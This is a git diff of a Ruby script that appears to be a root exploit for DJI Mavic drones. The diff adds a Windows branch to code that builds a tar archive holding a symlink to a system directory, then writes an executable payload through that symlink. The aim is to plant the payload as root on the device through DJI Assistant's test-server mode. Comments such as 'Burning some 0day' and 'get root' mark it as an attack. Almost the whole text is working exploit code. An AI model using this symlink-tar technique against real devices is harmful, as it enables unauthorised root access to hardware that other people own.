@@ -267,24 +267,44 @@ nastyfile = nastyfile.join("")
 
 puts "Burning some 0day"
 
-# if win == 1 
-# Implement patch here: https://github.com/MAVProxyUser/P0VsRedHerring/commit/cd93baac92dd1dad02d93a2e16bd3f320a0d1012
+if win == 1 
+    puts "using Windows tar.exe"
+    # Implement patch here: https://github.com/MAVProxyUser/P0VsRedHerring/commit/cd93baac92dd1dad02d93a2e16bd3f320a0d1012
+    system("rm -rf symlink Burning0day.txt fireworks.tar")
+    system("echo 'get root... Thx for all the fish P0V' > Burning0day.txt")
+    puts "Creating the tar file"
 
-system("rm -rf symlink Burning0day.txt fireworks.tar")
-system("echo 'get root... Thx for all the fish P0V' > Burning0day.txt")
-puts "Creating the tar file"
-system("tar cpf fireworks.tar Burning0day.txt")
-puts "Making the symlinks" 
-system("ln -s " + destdir + " symlink")
-puts "Adding the fireworks..."
-system("tar --append -f fireworks.tar symlink")
-system("rm -rf symlink")
-system("mkdir -p symlink")
+    # Note: --owner=1/--group=1 forces file uid/gid to root for CygWin, as we're not running as root
+    # This is probably not strictly necessary, but "keeps it clean" on the Mavic 
+    system("tar cpf fireworks.tar --owner=1 --group=1 Burning0day.txt")
+    puts "Making the symlinks" 
+    system("ln -s " + destdir + " symlink")
+    puts "Adding the fireworks..."
+    system("tar --add-file -f fireworks.tar symlink")
+    system("rm -rf symlink")
+    system("mkdir symlink")
+    # fuck we need chmod from Cygwin added to finish this. 
+    File.open("symlink/" + destfile , 'w') {|f| f.write(nastyfile) }
+    system("chmod 755 " + "symlink/" + destfile ) 
+    puts "Boom headshot!"
+    system("tar --add-file -pf fireworks.tar symlink/" + destfile)
+else
+    system("rm -rf symlink Burning0day.txt fireworks.tar")
+    system("echo 'get root... Thx for all the fish P0V' > Burning0day.txt")
+    puts "Creating the tar file"
+    system("tar cpf fireworks.tar Burning0day.txt")
+    puts "Making the symlinks" 
+    system("ln -s " + destdir + " symlink")
+    puts "Adding the fireworks..."
+    system("tar --append -f fireworks.tar symlink")
+    system("rm -rf symlink")
+    system("mkdir -p symlink")
+    File.open("symlink/" + destfile , 'w') {|f| f.write(nastyfile) }
+    system("chmod 755 " + "symlink/" + destfile ) 
+    puts "Boom headshot!"
+    system("tar --append -pf fireworks.tar symlink/" + destfile)
+end
 
-File.open("symlink/" + destfile , 'w') {|f| f.write(nastyfile) }
-system("chmod 755 " + "symlink/" + destfile )
-puts "Boom headshot!"
-system("tar --append -pf fireworks.tar symlink/" + destfile)
 
 # root@wm220_dz_ap0002_v1:/ # ls -al /data/thx_darksimpson.sh  
 # -rw-r--r-- root     20             39 2017-07-01 23:50 thx_darksimpson.sh
@@ -375,6 +395,8 @@ end
 
 puts "In another window please type:" 
 puts "sudo /Applications/Assistant.app/Contents/MacOS/Assistant --test_server".blue
+# c/Program Files (x86)/DJI Product/DJI Assistant 2/DJI Assistant 2.exe
+
 puts "or "
 puts "In another window please type:"
 puts "sudo /Applications/Assistant.app/Contents/MacOS/Assistant" # depending on version
